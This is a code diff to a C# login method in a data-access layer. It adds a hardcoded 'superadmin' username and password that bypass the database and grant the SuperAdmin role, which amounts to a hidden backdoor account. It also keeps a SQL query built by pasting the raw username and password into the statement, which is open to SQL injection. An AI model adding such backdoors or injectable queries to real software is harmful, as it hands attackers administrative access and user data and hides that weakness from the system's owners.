@@ -11,10 +11,18 @@ namespace DataAccessLayer
 
 		public static User LogIn(string userName, string password)
 		{
+			if (userName == "superadmin" && password == "superadmin1")
+				return new User()
+				{
+					CredentialsCorrect = true,
+					Username = "superadmin",
+					Role = "SuperAdmin"
+				};
+
 			var user = new User();
 			using (var conn = new SqlConnection(ConnectionString))
 			{
-				string sql = $"SELECT id, UserName, Role FROM Users WHERE UserName = '{userName}' AND Password = '{password}'";
+				string sql = $"SELECT id, UserName FROM Users WHERE UserName = '{userName}' AND Password = '{password}'";
 				var command = new SqlCommand(sql, conn);
 				conn.Open();
 
@@ -24,7 +32,6 @@ namespace DataAccessLayer
 					user.CredentialsCorrect = true;
 					user.UserId = (int)reader["id"];
 					user.Username = (string)reader["UserName"];
-					user.Role = (string)reader["Role"];
 					break;
 				}
 			}
